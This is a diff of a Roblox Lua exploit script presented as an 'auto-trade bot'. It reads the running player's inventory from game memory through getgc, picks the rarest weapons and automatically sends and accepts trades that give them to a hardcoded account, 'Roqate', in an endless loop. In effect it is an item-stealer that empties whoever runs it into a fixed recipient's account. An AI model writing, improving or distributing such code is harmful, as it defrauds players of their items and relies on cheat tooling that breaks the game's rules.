@@ -1,15 +1,13 @@
--- Ultimate Auto-Trade Bot with Rarity Priority
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local LocalPlayer = Players.LocalPlayer
 
--- Settings
 local TARGET_PLAYER = "Roqate"
 local MAX_ITEMS_PER_TRADE = 4
 local TRADE_COOLDOWN = 5
 local ITEM_ADD_DELAY = 0.3
 
--- Priority order for rarities (higher first)
+-- Priority: lower = better
 local RARITY_PRIORITY = {
     Godly = 1,
     Ancient = 2,
@@ -17,13 +15,11 @@ local RARITY_PRIORITY = {
     Classic = 4
 }
 
--- Allowed rarities set for quick check
 local ALLOWED_RARITIES = {}
 for rarity,_ in pairs(RARITY_PRIORITY) do
     ALLOWED_RARITIES[rarity] = true
 end
 
--- Remotes
 local TradeRemotes = {
     SendRequest = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("SendRequest"),
     OfferItem = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("OfferItem"),
@@ -33,55 +29,48 @@ local TradeRemotes = {
 local isTrading = false
 local lastTradeTime = 0
 
--- Helper: Find player
-local function findPlayer(name)
-    for _, player in ipairs(Players:GetPlayers()) do
-        if player.Name:lower() == name:lower() then
-            return player
+-- Find exact inventory module
+local function getCorrectMyInventory()
+    for _,module in ipairs(getgc(true)) do
+        if type(module) == "table" and rawget(module, "MyInventory") then
+            local inv = module.MyInventory
+            if inv.Data and inv.Data.Weapons and inv.Data.Weapons.Classic then
+                return inv
+            end
         end
     end
     return nil
 end
 
--- Helper: Check if Trade GUI is open
+local function findPlayer(name)
+    for _, p in ipairs(Players:GetPlayers()) do
+        if p.Name:lower() == name:lower() then
+            return p
+        end
+    end
+    return nil
+end
+
 local function isTradeGUIOpen()
     return LocalPlayer.PlayerGui:FindFirstChild("TradeGUI") or LocalPlayer.PlayerGui:FindFirstChild("TradeGUI_Phone")
 end
 
--- Helper: Wait until MyInventory is fully loaded
-local function waitForMyInventory()
-    local timeout = os.clock() + 15 -- wait max 15 seconds
-    while os.clock() < timeout do
-        for _,module in ipairs(getgc(true)) do
-            if type(module) == "table" and rawget(module, "MyInventory") then
-                local inv = module.MyInventory
-                if inv.Data and inv.Data.Weapons then
-                    return inv
-                end
-            end
-        end
-        task.wait(0.5)
-    end
-    return nil
-end
-
--- Collect best weapons with rarity priority
+-- Collect best weapons with correct inventory detection
 local function getBestWeapons()
-    local result = {}
-    local inv = waitForMyInventory()
+    local inv = getCorrectMyInventory()
     if not inv then
-        warn("❌ Could not load MyInventory (still nil after waiting)!")
-        return result
+        warn("❌ Could not find correct MyInventory!")
+        return {}
     end
 
-    local weaponCandidates = {}
+    local allWeapons = {}
 
     for categoryName, categoryTable in pairs(inv.Data.Weapons) do
         for weaponName, weaponData in pairs(categoryTable) do
             if weaponName ~= "DefaultKnife" and weaponName ~= "DefaultGun" then
                 local rarity = weaponData.Rarity
                 if rarity and ALLOWED_RARITIES[rarity] then
-                    table.insert(weaponCandidates, {
+                    table.insert(allWeapons, {
                         name = weaponName,
                         rarity = rarity,
                         priority = RARITY_PRIORITY[rarity] or 999
@@ -91,20 +80,19 @@ local function getBestWeapons()
         end
     end
 
-    -- Sort by priority (lower number = higher priority)
-    table.sort(weaponCandidates, function(a, b)
+    -- Sort best → worst
+    table.sort(allWeapons, function(a, b)
         return a.priority < b.priority
     end)
 
-    -- Pick top N
-    for i = 1, math.min(#weaponCandidates, MAX_ITEMS_PER_TRADE) do
-        table.insert(result, weaponCandidates[i].name)
+    local picked = {}
+    for i = 1, math.min(#allWeapons, MAX_ITEMS_PER_TRADE) do
+        table.insert(picked, allWeapons[i].name)
     end
 
-    return result
+    return picked
 end
 
--- Add weapons to trade
 local function addWeaponsToTrade()
     local weapons = getBestWeapons()
     if #weapons == 0 then
@@ -112,17 +100,15 @@ local function addWeaponsToTrade()
         return false
     end
 
-    print("✅ Adding weapons to trade:")
-    for _, weapon in ipairs(weapons) do
-        print("   →", weapon)
-        TradeRemotes.OfferItem:FireServer(weapon, "Weapons")
+    print("✅ Adding best weapons to trade:")
+    for _, w in ipairs(weapons) do
+        print("   →", w)
+        TradeRemotes.OfferItem:FireServer(w, "Weapons")
         task.wait(ITEM_ADD_DELAY)
     end
-
     return true
 end
 
--- Accept trade
 local function acceptTrade()
     if not isTradeGUIOpen() then
         warn("⚠ Trade GUI not open!")
@@ -132,18 +118,17 @@ local function acceptTrade()
     return true
 end
 
--- Full trade flow
 local function initiateTrade(targetPlayer)
     if isTrading or (os.time() - lastTradeTime) < TRADE_COOLDOWN then return end
 
     isTrading = true
     print("🔄 Starting trade with " .. targetPlayer.Name .. "...")
 
-    local success, err = pcall(function()
+    local ok, err = pcall(function()
         TradeRemotes.SendRequest:InvokeServer(targetPlayer)
     end)
 
-    if not success then
+    if not ok then
         warn("❌ Trade request failed:", err)
         isTrading = false
         return
@@ -173,7 +158,6 @@ local function initiateTrade(targetPlayer)
     lastTradeTime = os.time()
 end
 
--- Main loop
 while true do
     local target = findPlayer(TARGET_PLAYER)
     if target then
